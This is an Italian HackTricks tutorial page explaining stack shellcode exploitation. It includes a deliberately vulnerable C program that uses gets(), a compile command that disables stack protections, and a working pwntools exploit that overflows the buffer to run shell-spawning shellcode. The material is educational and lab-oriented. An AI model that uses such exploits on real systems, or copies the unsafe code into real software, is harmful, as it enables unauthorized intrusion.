# Shellcode dello Stack

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Informazioni di Base

Lo **shellcode dello stack** √® una tecnica utilizzata nell'**exploitation binaria** in cui un attaccante scrive dello shellcode nello stack di un programma vulnerabile e modifica il **Instruction Pointer (IP)** o **Extended Instruction Pointer (EIP)** per puntare alla posizione di questo shellcode, causandone l'esecuzione. Questo √® un metodo classico utilizzato per ottenere accesso non autorizzato o eseguire comandi arbitrari su un sistema di destinazione. Ecco una panoramica del processo, inclusi un semplice esempio in C e come potresti scrivere un exploit corrispondente utilizzando Python con **pwntools**.

### Esempio in C: Un Programma Vulnerabile

Iniziamo con un semplice esempio di un programma C vulnerabile:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Questo programma √® vulnerabile a un buffer overflow a causa dell'uso della funzione `gets()`.

### Compilazione

Per compilare questo programma disabilitando varie protezioni (per simulare un ambiente vulnerabile), puoi utilizzare il seguente comando:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: Disabilita la protezione dello stack.
* `-z execstack`: Rende lo stack eseguibile, il che √® necessario per eseguire lo shellcode memorizzato nello stack.
* `-no-pie`: Disabilita l'Esecuzione Indipendente dalla Posizione, facilitando la previsione dell'indirizzo di memoria in cui sar√† situato il nostro shellcode.
* `-m32`: Compila il programma come eseguibile a 32 bit, spesso utilizzato per semplificare lo sviluppo di exploit.

### Python Exploit usando Pwntools

Ecco come potresti scrivere uno sfruttamento in Python utilizzando **pwntools** per eseguire un attacco **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Questo script costruisce un payload composto da uno **slide NOP**, lo **shellcode**, e sovrascrive l'**EIP** con l'indirizzo che punta allo slide NOP, garantendo l'esecuzione dello shellcode.

Lo **slide NOP** (`asm('nop')`) viene utilizzato per aumentare la probabilit√† che l'esecuzione "scivoli" nel nostro shellcode indipendentemente dall'indirizzo esatto. Regolare l'argomento `p32()` con l'indirizzo di partenza del buffer pi√π un offset per atterrare nello slide NOP.

## Protezioni

* **ASLR** **dovrebbe essere disabilitato** affinch√© l'indirizzo sia affidabile tra le esecuzioni o l'indirizzo in cui la funzione sar√† memorizzata non sar√† sempre lo stesso e sarebbe necessario un leak per capire dove √® caricata la funzione win.
* Anche i **Canary dello Stack** dovrebbero essere disabilitati o l'indirizzo di ritorno compromesso di EIP non verr√† mai seguito.
* **NX** la protezione dello **stack** impedirebbe l'esecuzione dello shellcode all'interno dello stack perch√© quella regione non sarebbe eseguibile.

## Altri Esempi e Riferimenti

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64 bit, ASLR con leak dell'indirizzo dello stack, scrivere shellcode e saltare ad esso
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32 bit, ASLR con leak dello stack, scrivere shellcode e saltare ad esso
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32 bit, ASLR con leak dello stack, confronto per evitare la chiamata a exit(), sovrascrivere variabile con un valore e scrivere shellcode e saltare ad esso
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, senza ASLR, gadget ROP per rendere lo stack eseguibile e saltare allo shellcode nello stack
